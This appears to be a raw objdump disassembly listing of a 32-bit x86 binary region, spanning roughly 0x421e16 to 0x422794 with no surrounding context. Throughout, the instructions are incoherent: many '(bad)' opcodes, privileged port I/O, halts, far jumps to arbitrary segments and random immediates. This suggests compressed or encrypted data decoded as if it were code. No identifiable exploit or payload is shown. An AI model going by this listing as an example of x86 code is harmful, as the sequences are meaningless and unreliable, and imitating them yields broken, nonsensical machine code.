  421e16:	ins    DWORD PTR es:[edi],dx
  421e17:	fild   DWORD PTR [ecx-0x75baaa0f]
  421e1d:	sbb    al,0x43
  421e1f:	jnp    0x421ddc
  421e21:	hlt    
  421e22:	pop    ebp
  421e23:	ss dec edx
  421e25:	xchg   ah,cl
  421e27:	test   eax,0x9a8f4122
  421e2c:	mov    dl,BYTE PTR [esi]
  421e2e:	mov    eax,0xbd1fc323
  421e33:	jmp    0xab495ce5
  421e38:	cmp    dh,BYTE PTR [eax]
  421e3a:	push   esi
  421e3b:	daa    
  421e3c:	in     al,dx
  421e3d:	mov    ah,BYTE PTR [ecx-0x76cc6c9a]
  421e43:	nop
  421e44:	cmp    eax,0x62434d88
  421e49:	in     al,dx
  421e4a:	lods   al,BYTE PTR ds:[esi]
  421e4b:	retf   0xb588
  421e4e:	inc    esp
  421e4f:	mov    ecx,0x6d675c65
  421e54:	jle    0x421e6e
  421e56:	cmp    esp,0x51
  421e59:	sub    DWORD PTR [ecx],0xcfcdef9d
  421e5f:	xor    BYTE PTR [esi],dl
  421e61:	mov    cl,0xef
  421e63:	cdq    
  421e64:	add    dl,0xca
  421e67:	fidivr WORD PTR [ecx]
  421e69:	mov    esi,0x6f9e509d
  421e6e:	and    BYTE PTR [ecx+esi*4+0x2d39f299],bh
  421e75:	test   BYTE PTR [edx],0x17
  421e78:	ds (bad) 
  421e7b:	cmp    DWORD PTR [edi],eax
  421e7d:	jg     0x421e61
  421e7f:	mov    WORD PTR [edi],fs
  421e81:	push   ds
  421e82:	int3   
  421e83:	(bad)  
  421e84:	into   
  421e85:	fsubr  st,st(4)
  421e87:	mov    cl,0xb2
  421e89:	xchg   BYTE PTR [ecx+edx*4-0x63],dl
  421e8d:	push   0xb316321c
  421e92:	shr    BYTE PTR [esi+esi*1-0x3c61402c],cl
  421e99:	xor    bh,BYTE PTR [edx]
  421e9b:	push   es
  421e9c:	(bad)  
  421e9d:	jmp    0xb95:0x9c487a91
  421ea4:	xchg   DWORD PTR [esi],ecx
  421ea6:	mov    edi,0xb2c01d26
  421eab:	aas    
  421eac:	ins    DWORD PTR es:[edi],dx
  421ead:	sub    bl,0x5a
  421eb0:	jne    0x421e88
  421eb2:	clc    
  421eb3:	daa    
  421eb4:	pop    ds
  421eb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421eb6:	mov    ds:0xb2422030,al
  421ebb:	xchg   ebx,eax
  421ebc:	add    BYTE PTR [ebp+ecx*8-0x5bd7b7fe],0xbd
  421ec4:	xor    BYTE PTR [esi],ch
  421ec6:	enter  0x5d8,0x4b
  421eca:	sar    BYTE PTR [eax+0x6d],cl
  421ecd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421ece:	sahf   
  421ecf:	or     dh,BYTE PTR [ebp+0x3f]
  421ed2:	pop    ebx
  421ed3:	mov    bl,0xbc
  421ed5:	sti    
  421ed6:	fst    QWORD PTR [edx]
  421ed8:	inc    edi
  421ed9:	mov    bl,0x9e
  421edb:	dec    ebp
  421edc:	in     al,dx
  421edd:	sbb    DWORD PTR [ebx+0x66],edx
  421ee0:	push   edx
  421ee1:	mov    eax,0x6684be88
  421ee6:	mov    cl,0xe2
  421ee8:	jnp    0x421ee0
  421eea:	pop    esi
  421eeb:	repnz add esi,DWORD PTR [esi]
  421eee:	test   edx,eax
  421ef0:	imul   ebx,DWORD PTR [edx],0xfffffff9
  421ef3:	push   ebp
  421ef4:	cld    
  421ef5:	enter  0xc92c,0x5b
  421ef9:	jae    0x421f78
  421efb:	mov    eax,ds:0x20468c93
  421f00:	jo     0x421f13
  421f02:	cmp    eax,DWORD PTR [eax+0x4c3dfeb9]
  421f08:	sub    BYTE PTR [esi+0xb],cl
  421f0b:	cdq    
  421f0c:	add    al,0xc9
  421f0e:	lds    eax,FWORD PTR [ecx+0x22]
  421f11:	daa    
  421f12:	add    bl,ch
  421f14:	sbb    al,0xc3
  421f16:	jg     0x421f15
  421f18:	mov    eax,0x87382ef9
  421f1d:	and    ebx,eax
  421f1f:	je     0x421f24
  421f21:	inc    ecx
  421f22:	mov    cs,WORD PTR [ebx+0x74]
  421f25:	popf   
  421f26:	fimul  DWORD PTR [ebx]
  421f28:	neg    esp
  421f2a:	jo     0x421ee0
  421f2c:	mov    dh,0x35
  421f2e:	mov    WORD PTR [edi],fs
  421f30:	mov    gs,WORD PTR [ebx-0x6a]
  421f33:	icebp  
  421f34:	mov    bh,0x9e
  421f36:	not    BYTE PTR [edx+0x4c]
  421f39:	jg     0x421ee4
  421f3b:	jecxz  0x421ebe
  421f3d:	and    bl,BYTE PTR [edi-0x5d96e378]
  421f43:	jae    0x421f73
  421f45:	inc    ebx
  421f46:	(bad)  
  421f47:	call   0x92319ef
  421f4c:	dec    esp
  421f4d:	ret    0x6071
  421f50:	in     al,0x37
  421f52:	stos   DWORD PTR es:[edi],eax
  421f53:	fisubr DWORD PTR [ebx]
  421f55:	xlat   BYTE PTR ds:[ebx]
  421f56:	mov    dl,BYTE PTR [esi+ecx*4-0xd]
  421f5a:	or     dh,bh
  421f5c:	ret    0xb34f
  421f5f:	sub    cl,al
  421f61:	rcr    DWORD PTR [ebp+0x75],1
  421f64:	dec    si
  421f66:	mov    ecx,0x5be56862
  421f6b:	mov    cl,0x92
  421f6d:	out    0xe3,al
  421f6f:	push   ebp
  421f70:	loope  0x421fd2
  421f72:	lods   eax,DWORD PTR ds:[esi]
  421f73:	ret    0x7d49
  421f76:	loop   0x421f79
  421f78:	xlat   BYTE PTR ds:[ebx]
  421f79:	mov    dh,0xc3
  421f7b:	cmp    DWORD PTR [ecx],0x1df7a5d2
  421f81:	add    esp,ecx
  421f83:	mov    WORD PTR [ebx-0x80],cs
  421f86:	dec    ebx
  421f87:	lock xchg esi,eax
  421f89:	and    eax,0xf43fb22a
  421f8e:	(bad)  
  421f8f:	rcl    WORD PTR [eax+eax*4+0x3ae5bef4],1
  421f97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421f98:	outs   dx,DWORD PTR ds:[esi]
  421f99:	addr16 jge 0x421f74
  421f9c:	(bad)  
  421f9d:	out    dx,eax
  421f9e:	adc    BYTE PTR [ebx],ah
  421fa0:	aas    
  421fa1:	fidivr WORD PTR [esi]
  421fa3:	and    BYTE PTR [edi+esi*4+0x51],0x92
  421fa8:	xor    al,0x2b
  421faa:	push   esi
  421fab:	sbb    ah,0x2d
  421fae:	ja     0x421ff9
  421fb0:	lds    eax,FWORD PTR [edi+eiz*2-0x5f47d474]
  421fb7:	add    BYTE PTR [edx+0x3f],bh
  421fba:	push   cs
  421fbb:	lods   al,BYTE PTR ds:[esi]
  421fbc:	rcr    DWORD PTR ds:[eax-0x7293a6d],1
  421fc3:	and    BYTE PTR [ecx],dl
  421fc5:	rcl    DWORD PTR [eax+eax*4],1
  421fc8:	lock sbb ebx,ebx
  421fcb:	ror    DWORD PTR [ecx+0x12486cec],0x18
  421fd2:	mov    ah,0x1e
  421fd4:	or     DWORD PTR [ecx+0x75addc9b],0x42ae7dd2
  421fde:	mov    ebp,0x8303e30c
  421fe3:	adc    DWORD PTR [edi+0x1209cc3b],ebp
  421fe9:	sub    eax,0xe55094d6
  421fee:	into   
  421fef:	adc    DWORD PTR [esp+edx*2+0x72],esi
  421ff3:	push   ds
  421ff4:	mov    edx,0xf77c8212
  421ff9:	ror    eax,0xd6
  421ffc:	cmp    DWORD PTR [edi-0x7c],ebx
  421fff:	xchg   esp,eax
  422000:	rcr    ecx,cl
  422002:	into   
  422003:	adc    DWORD PTR [ebx+esi*2+0x6cecb639],esp
  42200a:	xchg   esp,eax
  42200b:	xlat   BYTE PTR ds:[ebx]
  42200c:	enter  0xe650,0x4b
  422010:	mov    ch,bl
  422012:	adc    BYTE PTR [edi+0x289becb8],0x88
  422019:	jo     0x422026
  42201b:	out    0xe,eax
  42201d:	xchg   edi,eax
  42201e:	test   al,0x74
  422020:	mov    ds:0xed8e6e5a,al
  422025:	push   ebx
  422026:	lea    ebp,[ecx]
  422028:	test   al,0xac
  42202a:	push   ebx
  42202b:	aaa    
  42202c:	sti    
  42202d:	outs   dx,DWORD PTR ds:[esi]
  42202e:	lods   eax,DWORD PTR ds:[esi]
  42202f:	shr    BYTE PTR ds:0xd885b38a,0xa0
  422036:	pop    ecx
  422037:	jmp    FWORD PTR [edx]
  422039:	jno    0x42204a
  42203b:	or     BYTE PTR [ebx-0x2389a02e],0xd7
  422042:	xchg   esp,eax
  422043:	mov    dh,0xe7
  422045:	mov    bl,0xe5
  422047:	and    DWORD PTR [esi+edi*4],edx
  42204a:	sub    al,0xfd
  42204c:	sbb    eax,0x3c3c9844
  422051:	push   ecx
  422052:	jmp    0xe246:0xfcade90e
  422059:	add    eax,0x9807e0f1
  42205e:	or     DWORD PTR [esi+eax*1-0x7b],esp
  422062:	out    dx,eax
  422063:	pop    ecx
  422064:	and    al,0xdb
  422066:	stc    
  422067:	sub    dl,0x60
  42206a:	int3   
  42206b:	clc    
  42206c:	imul   edx,esi,0xffffffe8
  42206f:	dec    ecx
  422070:	adc    BYTE PTR [edx-0x38a37a89],dh
  422076:	pop    edi
  422077:	pop    esi
  422078:	jb     0x42209e
  42207a:	into   
  42207b:	or     BYTE PTR [ebp-0x40],bh
  42207e:	inc    ebp
  42207f:	adc    BYTE PTR [ecx+0x9922d44],ch
  422085:	xor    dl,dl
  422087:	inc    ebx
  422088:	jmp    0x4220f1
  42208a:	(bad)  
  42208b:	outs   dx,BYTE PTR ds:[esi]
  42208c:	aad    0xcf
  42208e:	xchg   ebp,eax
  42208f:	ins    DWORD PTR es:[edi],dx
  422090:	dec    edi
  422091:	call   0x3694:0x7c71ae5d
  422098:	in     al,0x78
  42209a:	test   DWORD PTR [eax+ecx*1-0x25],edi
  42209e:	sub    eax,0xccef040
  4220a3:	data16 or BYTE PTR [eax-0x6c],0xf8
  4220a8:	fldenv [edx-0x65104be8]
  4220ae:	sbb    ah,BYTE PTR [ebp-0x50823c92]
  4220b4:	push   esi
  4220b5:	jae    0x4220ef
  4220b7:	pop    esi
  4220b8:	inc    ecx
  4220b9:	xor    cl,BYTE PTR [ebp+eax*1-0x5d]
  4220bd:	cmc    
  4220be:	rcr    BYTE PTR [ecx],1
  4220c0:	xchg   esp,eax
  4220c1:	(bad)  [ecx+0x6d]
  4220c4:	pop    ds
  4220c5:	(bad)  
  4220c6:	and    eax,0xfa
	...
  42229b:	add    BYTE PTR [eax+ecx*2],bh
  42229e:	inc    edx
  42229f:	add    BYTE PTR [eax+0x48],al
  4222a2:	inc    edx
  4222a3:	add    BYTE PTR [eax+ecx*2+0x42],al
  4222a7:	add    BYTE PTR [eax+0x48],cl
  4222aa:	inc    edx
  4222ab:	add    BYTE PTR [eax+ecx*2+0x42],cl
  4222af:	add    BYTE PTR [eax+0x48],dl
  4222b2:	inc    edx
  4222b3:	add    BYTE PTR [eax+ecx*2+0x42],dl
  4222b7:	add    BYTE PTR [eax+0x48],bl
  4222ba:	inc    edx
  4222bb:	add    BYTE PTR [ebp-0x29],dl
  4222be:	mov    edx,0x7defba87
  4222c3:	xlat   BYTE PTR ds:[ebx]
  4222c4:	lea    esp,[esi+edx*4+0x6a]
  4222c8:	xor    ebx,esp
  4222ca:	push   ecx
  4222cb:	adc    ecx,DWORD PTR [ebp+0xc]
  4222ce:	add    DWORD PTR [eax],eax
  4222d0:	and    al,BYTE PTR [edi]
  4222d2:	add    BYTE PTR [eax],al
  4222d4:	dec    BYTE PTR [ecx+0x57]
  4222d7:	jb     0x422296
  4222d9:	push   ds
  4222da:	mov    BYTE PTR [esi-0x7a5ead00],bl
  4222e0:	lock sbb esi,edi
  4222e3:	in     al,dx
  4222e4:	je     0x422271
  4222e6:	inc    esi
  4222e7:	out    0x7a,al
  4222e9:	mov    dl,0x4
  4222eb:	mov    ebx,0xd5d537b6
  4222f0:	stc    
  4222f1:	dec    esp
  4222f2:	mov    ebp,DWORD PTR [ebx+0x7d33bf2d]
  4222f8:	inc    ebp
  4222f9:	ror    DWORD PTR [edi],0xca
  4222fc:	xor    DWORD PTR [ebp+0x31],eax
  4222ff:	out    0x4,eax
  422301:	in     al,dx
  422302:	xchg   ecx,eax
  422303:	jle    0x422327
  422305:	or     al,0x23
  422307:	mov    esp,0x5cb673af
  42230c:	nop
  42230d:	inc    eax
  42230e:	mov    bh,0xba
  422310:	not    BYTE PTR [ebx]
  422312:	mov    dl,0x28
  422314:	and    al,cl
  422316:	jp     0x4222ee
  422318:	sub    ebp,DWORD PTR [eax]
  42231a:	mov    ah,0xa1
  42231c:	(bad)  
  42231d:	scas   al,BYTE PTR es:[edi]
  42231e:	inc    edx
  42231f:	or     eax,0xcd3eb5fa
  422324:	retf   
  422325:	arpl   bp,bp
  422327:	push   esi
  422328:	xor    eax,0x9657d024
  42232d:	pusha  
  42232e:	pop    ebp
  42232f:	add    DWORD PTR [ecx],edi
  422331:	ins    BYTE PTR es:[edi],dx
  422332:	loopne 0x422380
  422334:	mov    bh,0xcb
  422336:	and    eax,0xc08c62ed
  42233b:	dec    esp
  42233c:	jbe    0x422386
  42233e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42233f:	mov    WORD PTR [edi-0x65f3824b],fs
  422345:	pop    ecx
  422346:	sbb    bh,BYTE PTR [edx]
  422348:	dec    ebx
  422349:	jnp    0x42231a
  42234b:	fisttp QWORD PTR [esi-0x22]
  42234e:	(bad)  
  42234f:	sbb    BYTE PTR [ecx+0x5eb4711],bl
  422355:	lds    ebx,FWORD PTR [ecx+esi*8-0x3d]
  422359:	pop    edi
  42235a:	dec    ebx
  42235b:	adc    BYTE PTR ds:0xc5214cbf,ch
  422361:	cmp    al,BYTE PTR [ebp+edx*1+0x53]
  422365:	pop    es
  422366:	cmp    bl,BYTE PTR [esi+0x1f]
  422369:	or     ch,ah
  42236b:	xchg   BYTE PTR [ecx-0x43],ah
  42236e:	xchg   BYTE PTR [ecx+eax*1-0xaf4f4a2],ch
  422375:	inc    ebx
  422376:	lods   eax,DWORD PTR ds:[esi]
  422377:	adc    eax,0xa05c1787
  42237c:	ins    DWORD PTR es:[edi],dx
  42237d:	inc    edi
  42237e:	and    ah,bh
  422380:	leave  
  422381:	mov    ah,0x65
  422383:	sar    DWORD PTR [ebx-0x52],1
  422386:	and    BYTE PTR fs:[esi-0x79],al
  42238a:	adc    BYTE PTR [edx-0x799f6c46],ch
  422390:	sbb    eax,0xbd6afd6f
  422395:	retf   
  422396:	mov    al,ds:0xbbb703be
  42239b:	out    0x84,al
  42239d:	fscale 
  42239f:	out    0xf7,eax
  4223a1:	mov    edi,esp
  4223a3:	add    eax,0xf9cc3fa6
  4223a8:	mov    dl,0x5f
  4223aa:	mov    eax,0xecba3b3b
  4223af:	pop    edi
  4223b0:	and    BYTE PTR [ebx+0x7e],ch
  4223b3:	pop    ebp
  4223b4:	or     eax,0x4b175d6b
  4223b9:	leavew 
  4223bb:	jp     0x4223f3
  4223bd:	arpl   WORD PTR [esi+0x4a],di
  4223c0:	sub    cl,dh
  4223c2:	adc    eax,0x55996bdc
  4223c7:	or     al,0xdc
  4223c9:	lock dec ebp
  4223cb:	jne    0x42243b
  4223cd:	mov    ch,BYTE PTR [eax]
  4223cf:	mov    ch,0x89
  4223d1:	sub    esp,DWORD PTR [eax]
  4223d3:	pop    ss
  4223d4:	pop    esi
  4223d5:	or     ebp,edi
  4223d7:	dec    eax
  4223d8:	sub    al,0x25
  4223da:	xchg   edx,eax
  4223db:	lds    eax,FWORD PTR [eax]
  4223dd:	mov    bl,0x80
  4223df:	mov    ebx,0x36713e2c
  4223e4:	jp     0x422447
  4223e6:	mov    bh,0x77
  4223e8:	adc    bl,0x76
  4223eb:	inc    esp
  4223ec:	call   0xb4d0ccc3
  4223f1:	into   
  4223f2:	repnz and ebp,DWORD PTR [edx-0x2d]
  4223f6:	retf   0x4b53
  4223f9:	int    0x18
  4223fb:	ss jmp 0xd0c8:0x614020ac
  422403:	add    BYTE PTR [ecx],ch
  422405:	or     bl,BYTE PTR [ebp+0x39]
  422408:	push   eax
  422409:	or     cl,BYTE PTR [edi-0x2233461d]
  42240f:	(bad)  
  422411:	cli    
  422412:	jge    0x422395
  422414:	mov    eax,ds:0x4e34ccdd
  422419:	iret   
  42241a:	rcr    DWORD PTR [ecx+0xe],1
  42241d:	mov    al,0x3a
  42241f:	imul   eax,esp,0xffffffd8
  422422:	retf   
  422423:	ret    
  422424:	sub    al,0x21
  422426:	dec    ebx
  422427:	jle    0x422472
  422429:	mov    bh,BYTE PTR [ecx-0xde71406]
  42242f:	jns    0x4223b7
  422431:	pop    ds
  422432:	loope  0x42241c
  422434:	push   ss
  422435:	sti    
  422436:	test   al,0xf0
  422438:	sbb    esp,0x67e1571e
  42243e:	cmp    DWORD PTR [ebx+0x21],0xcc580827
  422445:	mov    BYTE PTR [edi-0x62],cl
  422448:	call   0xc488:0x6c161e63
  42244f:	out    dx,eax
  422450:	or     eax,0x333cf478
  422455:	adc    eax,0x7fe9df8d
  42245a:	or     al,0xbd
  42245c:	xchg   edi,eax
  42245d:	inc    edi
  42245e:	nop
  42245f:	xor    ebx,DWORD PTR fs:[esi+0x8]
  422463:	repnz fwait
  422465:	and    DWORD PTR [eax],ecx
  422467:	push   edx
  422468:	and    BYTE PTR [ebp-0x25],cl
  42246b:	nop
  42246c:	fsub   st,st(4)
  42246e:	in     eax,dx
  42246f:	clc    
  422470:	jge    0xb34ea65d
  422476:	sub    al,ah
  422478:	lock xchg esi,eax
  42247a:	mov    bl,0x60
  42247c:	inc    ebx
  42247d:	jge    0x422470
  42247f:	in     al,0x1b
  422481:	mov    edx,0x83bc024b
  422486:	lods   al,BYTE PTR ds:[esi]
  422487:	outs   dx,BYTE PTR ds:[esi]
  422489:	jno    0x42242d
  42248b:	rol    WORD PTR [edx-0x6a],0xef
  422490:	add    al,0xc8
  422492:	push   0x2c
  422494:	loop   0x4224a8
  422496:	fs xchg esi,eax
  422498:	not    ebp
  42249a:	loop   0x42245c
  42249c:	loop   0x42246e
  42249e:	ret    
  42249f:	cmp    ebp,esp
  4224a1:	(bad)  
  4224a2:	fcomp  DWORD PTR [ebp+0x55e15d9a]
  4224a8:	test   al,0x65
  4224aa:	aad    0x6c
  4224ac:	lock pusha 
  4224ae:	cmp    DWORD PTR [edx+eiz*2],ebp
  4224b1:	in     al,0x3d
  4224b3:	pop    edi
  4224b4:	cmp    al,0xc5
  4224b6:	push   esp
  4224b7:	hlt    
  4224b8:	push   esi
  4224b9:	test   BYTE PTR [edi+0x34],cl
  4224bc:	nop
  4224bd:	inc    esi
  4224be:	pop    edi
  4224bf:	ins    BYTE PTR es:[edi],dx
  4224c0:	jno    0x422529
  4224c2:	hlt    
  4224c3:	inc    ebp
  4224c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4224c5:	fadd   st(2),st
  4224c7:	rcl    DWORD PTR [edx+0x29],cl
  4224ca:	mov    ah,0xab
  4224cc:	sbb    al,0x3
  4224ce:	mov    dl,0x44
  4224d0:	lods   eax,DWORD PTR ds:[esi]
  4224d1:	icebp  
  4224d2:	loope  0x42249c
  4224d4:	adc    ah,ah
  4224d6:	xchg   esp,eax
  4224d7:	aam    0xd2
  4224d9:	mov    ah,BYTE PTR [eax]
  4224db:	and    eax,0xf8ef04d8
  4224e0:	cmp    ah,BYTE PTR [esi+0x7c]
  4224e3:	inc    edx
  4224e4:	mov    ecx,DWORD PTR [ecx+0x34]
  4224e7:	fld    TBYTE PTR [esi+0x409c2bdd]
  4224ed:	es leave 
  4224ef:	mov    ch,0x0
  4224f1:	push   ecx
  4224f2:	ds repnz (bad) 
  4224f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4224f6:	ja     0x4224d6
  4224f8:	fild   WORD PTR [ebp+0x20]
  4224fb:	sbb    BYTE PTR ds:0xc9aaacd7,0xb2
  422502:	add    al,0x9a
  422504:	scas   eax,DWORD PTR es:[edi]
  422505:	sar    DWORD PTR [bp+0x53cd],1
  42250a:	jg     0x4224c6
  42250c:	shr    DWORD PTR [ebx+0x45c5c3a2],0x4a
  422513:	(bad)
  422516:	add    BYTE PTR [eax-0x5345ee08],0x2a
  42251d:	out    dx,al
  42251e:	jbe    0x42251c
  422520:	out    0x64,eax
  422522:	out    dx,al
  422523:	xchg   ebp,eax
  422524:	mov    DWORD PTR [ebp-0x299df71d],esi
  42252a:	or     edi,DWORD PTR [ebx+ebp*4-0x4e]
  42252e:	retf   0xd6df
  422531:	jb     0x422566
  422533:	xchg   ecx,eax
  422534:	lahf   
  422535:	ins    BYTE PTR es:[edi],dx
  422536:	pop    edi
  422537:	cmp    al,0x62
  422539:	ret    
  42253a:	xchg   BYTE PTR [esi+0x6d7f9348],ch
  422540:	in     eax,0x1b
  422542:	add    DWORD PTR [ecx+0x6d],eax
  422545:	sti    
  422546:	xor    BYTE PTR [esp+ebx*1-0x1ddf22eb],ah
  42254d:	pop    edi
  42254e:	sbb    esi,ebp
  422550:	stos   DWORD PTR es:[edi],eax
  422551:	pusha  
  422552:	or     ebp,ecx
  422554:	sbb    eax,0xd4ce1b87
  422559:	sbb    ch,BYTE PTR [ecx-0x53c8b88]
  42255f:	outs   dx,DWORD PTR ds:[esi]
  422560:	(bad)  
  422561:	nop
  422562:	cwde   
  422563:	mov    ebx,0xcbda6fbe
  422568:	mov    eax,0xb9cfb9cc
  42256d:	call   0x55ec:0xa2553b76
  422574:	das    
  422575:	aaa    
  422576:	retf   0xe260
  422579:	dec    eax
  42257a:	jle    0x4225eb
  42257c:	cs ret 
  42257e:	mov    bl,0x99
  422580:	cmp    dl,BYTE PTR [ecx]
  422582:	adc    BYTE PTR [si+0x73],ch
  422586:	aas    
  422587:	fcomi  st,st(4)
  422589:	mov    edi,0x7fe49c12
  42258e:	mov    esp,esi
  422590:	sub    ebp,DWORD PTR [edi+0x65]
  422593:	and    edx,DWORD PTR [ebx+eiz*2+0x18c24642]
  42259a:	xchg   ebx,eax
  42259b:	les    esp,FWORD PTR [edi]
  42259d:	push   ecx
  42259e:	ret    0xe7a6
  4225a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225a2:	retf   
  4225a3:	not    BYTE PTR [esi]
  4225a5:	push   ss
  4225a6:	out    0xea,eax
  4225a8:	scas   eax,DWORD PTR es:[edi]
  4225a9:	dec    esi
  4225aa:	add    esp,DWORD PTR [eax]
  4225ac:	push   edi
  4225ad:	neg    BYTE PTR [ecx+0x37]
  4225b0:	add    eax,0xf7e09975
  4225b5:	(bad)  
  4225b6:	fistp  WORD PTR [edi+0x1e939d2d]
  4225bc:	frstor [esi-0x4ad0ca96]
  4225c2:	pop    es
  4225c3:	fs jle 0x4225a8
  4225c6:	and    ah,0x3e
  4225c9:	jl     0x422603
  4225cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4225cc:	scas   eax,DWORD PTR es:[edi]
  4225cd:	repnz push es
  4225cf:	jmp    0x976:0x1924519e
  4225d6:	fidiv  DWORD PTR [edi]
  4225d8:	mov    esi,DWORD PTR [eax]
  4225da:	sti    
  4225db:	lock scas eax,DWORD PTR es:[edi]
  4225dd:	inc    edi
  4225de:	or     ah,bh
  4225e0:	mov    esp,0x967fc147
  4225e5:	or     cl,BYTE PTR [ebx]
  4225e7:	push   ebp
  4225e8:	jp     0x42261b
  4225ea:	jmp    0xa8ce7635
  4225ef:	in     eax,dx
  4225f0:	xchg   esp,eax
  4225f1:	icebp  
  4225f2:	test   ebx,edi
  4225f4:	push   eax
  4225f5:	shl    esp,cl
  4225f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225f8:	fwait
  4225f9:	idiv   esp
  4225fb:	add    DWORD PTR [esi-0x6e],edi
  4225fe:	mov    eax,ds:0xa4e7feda
  422603:	fsub   DWORD PTR [ecx+esi*4-0x2846bc49]
  42260a:	adc    BYTE PTR [eax-0x7f],dh
  42260d:	(bad)  
  42260f:	ret    
  422610:	xor    bl,BYTE PTR [ebx+ebx*8-0x65]
  422614:	fidiv  DWORD PTR [ebx]
  422616:	push   esp
  422617:	iret   
  422618:	and    esp,ebp
  42261a:	psrlq  mm6,QWORD PTR [ecx]
  42261d:	sahf   
  42261e:	pop    ebx
  42261f:	mov    ds:0xc1157f02,eax
  422624:	xor    ebp,esi
  422626:	fst    st(3)
  422628:	lods   al,BYTE PTR ds:[esi]
  422629:	mov    BYTE PTR [eax-0x40],cl
  42262c:	and    BYTE PTR [edi+0x7],ch
  42262f:	dec    ebp
  422630:	outs   dx,BYTE PTR ds:[esi]
  422631:	mov    esp,0xc3464607
  422636:	pop    ebx
  422637:	in     eax,0x2a
  422639:	dec    esp
  42263a:	(bad)  
  42263b:	in     eax,0x37
  42263d:	pop    ds
  42263e:	fmul   st,st(3)
  422640:	inc    ecx
  422641:	test   dl,al
  422643:	add    dl,BYTE PTR [ebp+0x4f89ffd5]
  422649:	pop    es
  42264a:	addr16 and al,0x73
  42264d:	pop    esi
  42264e:	pusha  
  42264f:	call   0x81a5bff1
  422654:	xor    ecx,DWORD PTR [edi+0x29e1dcd3]
  42265a:	inc    ebp
  42265b:	mov    WORD PTR [edi],fs
  42265d:	jo     0x42265c
  42265f:	fstp   DWORD PTR [ecx-0x67dab118]
  422665:	scas   al,BYTE PTR es:[edi]
  422666:	sar    DWORD PTR [edx+0x51],cl
  422669:	lods   al,BYTE PTR ds:[esi]
  42266a:	jg     0x4226e3
  42266c:	push   ss
  42266d:	in     eax,dx
  42266e:	ficomp DWORD PTR [ebp+0x53]
  422671:	jge    0x42262f
  422673:	clc    
  422674:	jecxz  0x4226de
  422676:	fiadd  WORD PTR [esi+0x7930ed9f]
  42267c:	sti    
  42267d:	(bad)  
  42267f:	inc    ebx
  422680:	idiv   esp
  422682:	test   BYTE PTR [eax+0x310dfbee],bl
  422688:	jmp    0x246e0213
  42268d:	lods   eax,DWORD PTR ds:[esi]
  42268e:	enter  0xfcae,0x45
  422692:	or     ebx,eax
  422694:	ficom  DWORD PTR [edi+edi*4+0x67]
  422698:	sub    ah,0x1a
  42269b:	into   
  42269c:	mov    WORD PTR [edi],cs
  42269e:	icebp  
  42269f:	jb     0x4226f5
  4226a1:	popf   
  4226a2:	mov    ecx,0x3ac5af23
  4226a7:	add    BYTE PTR [edi-0x5e404e00],0x1e
  4226ae:	test   DWORD PTR [ebx+0x4fd60005],eax
  4226b4:	or     DWORD PTR ds:0xa1f37c6f,eax
  4226ba:	lahf   
  4226bb:	gs push 0x2e
  4226be:	adc    ebp,DWORD PTR [eax+0x92d4423]
  4226c4:	ret    
  4226c5:	adc    bl,bh
  4226c7:	adc    bl,BYTE PTR [ebp+0x3fd17eb4]
  4226cd:	pop    esi
  4226ce:	stos   DWORD PTR es:[edi],eax
  4226cf:	imul   ebx,DWORD PTR ds:0x66b14694,0x3c
  4226d6:	je     0x42270e
  4226d8:	push   ebx
  4226d9:	outs   dx,DWORD PTR ds:[esi]
  4226da:	xchg   ebp,eax
  4226db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226dc:	mov    edi,0x46dfc294
  4226e1:	(bad)  
  4226e2:	jb     0x422742
  4226e4:	stc    
  4226e5:	cmp    eax,0xce848823
  4226ea:	adc    cl,BYTE PTR ds:0x8d61fb07
  4226f0:	out    0x9,al
  4226f2:	jecxz  0x42271c
  4226f4:	ret    
  4226f5:	aaa    
  4226f6:	in     al,dx
  4226f7:	jecxz  0x4226ea
  4226f9:	cli    
  4226fa:	sbb    DWORD PTR [edx+0x51],ebx
  4226fd:	stc    
  4226fe:	jmp    0x5657:0x147042a7
  422705:	mov    bl,0x48
  422707:	cmp    BYTE PTR [esi-0x79e08e9c],0x7
  42270e:	push   ebp
  42270f:	sbb    al,0x16
  422711:	rcl    DWORD PTR [eax-0x716faba0],0xe3
  422718:	mov    BYTE PTR [esi+ebp*1+0x7ac12098],0xc6
  422720:	sub    al,0x6d
  422722:	cmp    eax,0x489c7224
  422727:	cmp    DWORD PTR [edx-0xe],esi
  42272a:	dec    esp
  42272b:	or     al,0xf9
  42272d:	lds    ebx,FWORD PTR [edx+0x6a]
  422730:	mov    ch,0xd8
  422732:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422733:	mov    ds:0x467f6b49,eax
  422738:	add    eax,0x34f6122a
  42273d:	cli    
  42273e:	xchg   ch,dl
  422740:	xchg   ebp,eax
  422741:	xor    bl,BYTE PTR [ebx+edi*2-0xcd854f6]
  422748:	pop    ebx
  422749:	dec    edx
  42274a:	scas   eax,DWORD PTR es:[edi]
  42274b:	mov    ah,0x72
  42274d:	int    0x16
  42274f:	cmp    al,dl
  422751:	mov    ecx,DWORD PTR [esi]
  422753:	mov    bl,0x66
  422755:	mov    ds:0x3457a040,eax
  42275a:	imul   ecx,esi,0x5
  42275d:	sbb    DWORD PTR [ecx],esi
  42275f:	inc    ebp
  422760:	dec    esi
  422761:	ret    0xc401
  422764:	lea    esi,[eax-0x2e9a2f8]
  42276a:	loope  0x42271d
  42276c:	mov    ebx,0xce4ad3e1
  422771:	xchg   edx,eax
  422772:	sub    edi,DWORD PTR [ebx]
  422774:	mov    esi,DWORD PTR [edx-0x11]
  422777:	xchg   edi,eax
  422778:	aad    0xee
  42277a:	(bad)  
  42277b:	icebp  
  42277c:	jg     0x4227b1
  42277e:	sub    DWORD PTR [esi-0x4],ecx
  422781:	fisub  DWORD PTR [edi]
  422783:	addr16 push ecx
  422785:	pinsrw mm1,ebp,0x9
  422789:	pushf  
  42278a:	sbb    al,0x12
  42278c:	(bad)  
  42278d:	cmp    bh,al
  42278f:	and    al,0x8c
  422791:	(bad)  
  422792:	jo     0x422735
  422794:	aam    0x38
